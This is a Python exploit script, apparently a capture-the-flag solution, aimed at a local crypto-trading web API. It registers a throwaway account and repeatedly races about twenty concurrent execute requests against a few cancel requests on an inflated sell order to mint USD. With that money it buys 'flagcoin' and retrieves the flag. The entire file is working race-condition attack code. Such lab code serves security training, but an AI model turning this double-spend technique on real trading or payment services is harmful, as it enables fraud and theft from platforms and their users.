import requests
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor

API = "http://localhost:5001/api"

def rand_str(n=8):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(n))

def register_random_user():
    username = f"user_{rand_str(6)}"
    email = f"{username}@example.com"
    password = rand_str(10)
    r = requests.post(f"{API}/auth/register", json={
        "username": username,
        "email": email,
        "password": password
    })
    if r.status_code not in (200,201):
        raise RuntimeError(f"Register failed: {r.status_code} {r.text}")
    return username, password

def login(username, password):
    r = requests.post(f"{API}/auth/login", json={"username": username, "password": password})
    if r.status_code != 200:
        raise RuntimeError(f"Login failed: {r.status_code} {r.text}")
    token = r.json()['access_token']
    return {"Authorization": f"Bearer {token}"}

def get_wallet(headers):
    r = requests.get(f"{API}/trading/wallet", headers=headers)
    return r.json() if r.status_code == 200 else []

def create_sell_order(headers, coin="CTFcoin", amount=10.0, target_price=100000.0):
    r = requests.post(f"{API}/trading/create-order", headers=headers, json={
        "coin": coin,
        "amount": amount,
        "order_type": "SELL",
        "price_type": "limit",
        "target_price": target_price
    })
    if r.status_code not in (200,201):
        raise RuntimeError(f"Create order failed: {r.status_code} {r.text}")
    return r.json()["order"]["id"]

def race_execute_cancel(headers, order_id, executes=20, cancels=3, sleep_after=0.5):
    with ThreadPoolExecutor(max_workers=executes + cancels) as pool:
        for _ in range(executes):
            pool.submit(requests.post, f"{API}/trading/execute-order/{order_id}", headers=headers)
        for _ in range(cancels):
            pool.submit(requests.post, f"{API}/trading/cancel-order/{order_id}", headers=headers)
    time.sleep(sleep_after)

def buy_flagcoin(headers, amount=1.0):
    # BUY market (auto-ejecutado en backend)
    r = requests.post(f"{API}/trading/create-order", headers=headers, json={
        "coin": "flagcoin",
        "amount": amount,
        "order_type": "BUY",
        "price_type": "market"
    })
    if r.status_code not in (200,201):
        raise RuntimeError(f"Buy flagcoin failed: {r.status_code} {r.text}")
    time.sleep(0.1)

def get_user_flag(headers):
    r = requests.get(f"{API}/flags/user", headers=headers)
    return r.json() if r.status_code == 200 else r.json()

def main(iterations=15):
    username, password = register_random_user()
    print(f"Registered: {username} / {password}")
    headers = login(username, password)
    print("Logged in, starting race...")

    # Initial wallet
    wallet = get_wallet(headers)
    print("Wallet (initial):", wallet)
    
    ctf_balance = next((w['balance'] for w in wallet if w['coin'] == 'CTFcoin'), 0.0)
    if ctf_balance <= 0:
        raise RuntimeError("No CTFcoin balance to exploit")

    for i in range(iterations):
        wallet = get_wallet(headers)
        ctf_available = next((w['available'] for w in wallet if w['coin'] == 'CTFcoin'), 0.0)
        usd_balance = next((w['balance'] for w in wallet if w['coin'] == 'USD'), 0.0)
        
        if ctf_available <= 0:
            print(f"[Iter {i+1}] No CTFcoin available, stopping. USD: {usd_balance:,.0f}")
            break
        
        # Vender todo el CTFcoin disponible a precio alto
        oid = create_sell_order(headers, coin="CTFcoin", amount=ctf_available, target_price=100000.0)
        race_execute_cancel(headers, oid, executes=20, cancels=3, sleep_after=0.5)
        
        wallet = get_wallet(headers)
        usd_balance = next((w['balance'] for w in wallet if w['coin'] == 'USD'), 0.0)
        print(f"Iteration {i+1} - USD: {usd_balance:,.0f}")
        
        if usd_balance >= 1000000:
            print(f"Target reached! USD: {usd_balance:,.0f}")
            break

    # Buy flagcoin and fetch flag
    wallet = get_wallet(headers)
    usd_balance = next((w['balance'] for w in wallet if w['coin'] == 'USD'), 0.0)
    print(f"\nFinal USD before purchase: {usd_balance:,.0f}")
    
    buy_flagcoin(headers, amount=1.0)
    
    wallet = get_wallet(headers)
    flagcoin_balance = next((w['balance'] for w in wallet if w['coin'] == 'flagcoin'), 0.0)
    print(f"FlagCoin balance: {flagcoin_balance}")
    
    flag = get_user_flag(headers)
    print("User flag response:", flag)

if __name__ == "__main__":
    main(iterations=15)